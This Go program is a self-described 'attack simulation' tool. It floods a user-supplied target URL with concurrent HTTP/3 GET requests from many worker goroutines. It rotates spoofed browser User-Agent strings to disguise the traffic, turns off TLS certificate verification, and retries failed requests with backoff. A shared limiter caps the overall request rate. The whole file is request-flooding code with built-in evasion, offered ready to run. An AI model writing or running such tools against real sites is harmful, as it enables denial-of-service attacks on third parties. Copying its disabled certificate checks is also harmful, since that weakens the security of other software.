package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/quic-go/quic-go/http3"
	"github.com/valyala/fastrand"
	"golang.org/x/time/rate"
)

type LogEntry struct {
	Timestamp string `json:"timestamp"`
	WorkerID  int    `json:"worker_id"`
	Level     string `json:"level"`
	Message   string `json:"message"`
	Error     string `json:"error,omitempty"`
}

func logJSON(workerID int, level, message string, err error) {
	entry := LogEntry{
		Timestamp: time.Now().Format(time.RFC3339),
		WorkerID:  workerID,
		Level:     level,
		Message:   message,
	}
	if err != nil {
		entry.Error = err.Error()
	}
	logData, _ := json.Marshal(entry)
	fmt.Println(string(logData))
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())

	go func() {
		log.Println(http.ListenAndServe("localhost:6060", nil))
	}()

	reader := bufio.NewReader(os.Stdin)
	targetURL := getInput(reader, "Enter target URL (e.g., https://target.example.com): ")
	numWorkers := getIntInput(reader, "Enter the number of workers (e.g., 64): ")
	numRequests := getIntInput(reader, "Enter the number of requests per worker (e.g., 10000): ")

	fmt.Println("Starting attack simulation...")

	ratePerSecond := 20
	limiter := rate.NewLimiter(rate.Every(time.Second/time.Duration(ratePerSecond)), ratePerSecond)

	var wg sync.WaitGroup
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			client, err := createHttp3Client()
			if err != nil {
				logJSON(workerID, "ERROR", "Error creating HTTP client", err)
				return
			}
			executeRequests(ctx, client, targetURL, numRequests, limiter, workerID)
		}(i)
	}

	wg.Wait()
	fmt.Println("Attack simulation complete.")
}

func getInput(reader *bufio.Reader, prompt string) string {
	fmt.Print(prompt)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

func getIntInput(reader *bufio.Reader, prompt string) int {
	input := getInput(reader, prompt)
	value, err := strconv.Atoi(input)
	if err != nil {
		log.Fatalf("Invalid input: %v", err)
	}
	return value
}

func executeRequests(ctx context.Context, client *http.Client, targetURL string, numRequests int, limiter *rate.Limiter, workerID int) {
	successCount := 0
	failureCount := 0

	for i := 0; i < numRequests; i++ {
		if err := limiter.Wait(ctx); err != nil {
			logJSON(workerID, "ERROR", "Rate limiter error", err)
			failureCount++
			continue
		}

		req, err := http.NewRequest("GET", targetURL, nil)
		if err != nil {
			logJSON(workerID, "ERROR", "Error creating request", err)
			failureCount++
			continue
		}

		randomizeRequestHeaders(req)
		resp, err := retryRequest(client, req, workerID, 3)
		if err != nil {
			logJSON(workerID, "ERROR", "Request failed after retries", err)
			failureCount++
			continue
		}
		resp.Body.Close()
		successCount++
		time.Sleep(randomDelay(10*time.Millisecond, 50*time.Millisecond))
	}

	logJSON(workerID, "INFO", fmt.Sprintf("Worker completed: Success: %d, Failures: %d", successCount, failureCount), nil)
}

func retryRequest(client *http.Client, req *http.Request, workerID int, retries int) (*http.Response, error) {
	var err error
	var resp *http.Response
	backoff := time.Millisecond * 100

	for i := 0; i < retries; i++ {
		resp, err = client.Do(req)
		if err == nil {
			return resp, nil
		}
		logJSON(workerID, "WARNING", fmt.Sprintf("Retry %d failed", i+1), err)
		time.Sleep(backoff)
		backoff *= 2
	}
	return nil, err
}

func randomizeRequestHeaders(req *http.Request) {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/86.0",
	}
	req.Header.Set("User-Agent", agents[fastrand.Uint32n(uint32(len(agents)))])
}

func createHttp3Client() (*http.Client, error) {
	transport := &http3.RoundTripper{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}, nil
}

func randomDelay(min, max time.Duration) time.Duration {
	return min + time.Duration(fastrand.Uint32n(uint32(max-min)))
}
